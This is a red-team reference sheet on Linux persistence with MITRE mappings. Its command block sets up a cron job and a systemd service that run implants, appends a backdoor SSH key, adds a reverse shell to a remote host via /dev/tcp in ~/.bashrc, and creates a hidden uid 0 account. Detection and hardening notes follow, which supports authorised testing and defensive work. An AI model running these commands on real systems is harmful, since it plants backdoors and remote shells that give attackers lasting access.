---
title: "Linux Persistence"
category: "red-team"
tags: ["persistence", "linux"]
platform: "linux"
mitre: ["T1053", "T1543", "T1098"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Linux Persistence

## TL;DR
Maintaining access: cron, systemd, SSH keys, shell profile modification, accounts. Always document and clean up after the engagement.

## Techniques
```bash
# Cron
(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/.rev.sh") | crontab -
echo '* * * * * root /path/impl' >> /etc/cron.d/updates

# systemd service + timer
cat >/etc/systemd/system/updater.service <<'EOF'
[Service]
ExecStart=/usr/bin/impl
EOF
systemctl enable --now updater

# SSH authorized_keys (backdoor key)
echo 'ssh-ed25519 AAAA... atk' >> ~/.ssh/authorized_keys

# Shell rc
echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1 &' >> ~/.bashrc

# New uid 0 account (very loud)
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash svc
```

## Detection (Blue Team)
- auditd: changes to `/etc/cron*`, `authorized_keys`, `/etc/passwd`, systemd units.
- Baseline (AIDE) on rc-files and cron; alert on new uid 0 accounts.
- Unusual processes from cron/systemd connecting outbound.

## Mitigation / Hardening
- Immutable/monitored key files, `auditd` FIM rules.
- Disable key login where unneeded, rotate `authorized_keys`.
- Least privilege, no uid 0 accounts other than root.

## Sources
- [MITRE Persistence (Linux)](https://attack.mitre.org/tactics/TA0003/)
